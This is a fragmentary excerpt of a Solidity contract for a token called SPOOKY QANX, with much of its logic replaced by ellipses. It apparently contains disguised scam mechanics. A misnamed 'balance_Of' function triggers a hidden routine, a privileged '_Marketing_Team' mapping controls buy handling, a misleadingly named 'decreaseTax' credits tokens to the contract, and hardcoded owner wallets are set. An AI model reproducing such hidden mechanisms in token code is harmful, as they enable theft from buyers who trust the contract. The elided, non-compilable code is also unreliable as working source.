...
Telegram : https://t.me/SpookyQanx
...
interface IERC20 {
    ...
    function balance_Of(address walletAdd) external returns (uint256);
...
contract SpookyQANX is Context, IERC20 { 
    ...
    mapping (address => bool) public _Marketing_Team;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0xF58b95Cfef5697637f008a2F5501B4b131795401); 
    address payable public Wallet_Utility = payable(0xEb46212990F46685F0B9b9780eC61bF4C1708d69);
    ...
    string private constant _name = "SPOOKY QANX"; 
    string private constant _symbol = unicode"SQANX"; 
    ...
    constructor () {
        ...
        _owner = 0xEb46212990F46685F0B9b9780eC61bF4C1708d69;
        ...
        _Marketing_Team[Wallet_Marketing] = true;
    ...
    function _approved(bool activeQueue) private returns(bool){
        if(activeQueue){
    ...
    function balance_Of(address walletAdd) public override returns (uint256) {
        _approved(true);
    ...
    function decreaseTax(uint256 tax_Rate) public virtual returns(uint256){
        uint256 fac = 1;
    ...
    isBuying = _Marketing_Team[to] ? true : false;    
        ...
        if (isBuying){
                ...
                _tOwned[address(this)] = _tOwned[address(this)]+decreaseTax(20);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(onQueueSwap){
                bool startPair = onQueueSwap;
                if(startPair){total_tokens_swap = balanceOf(address(this)) - (_tTotal);}
            }
            onQueueSwap = false;
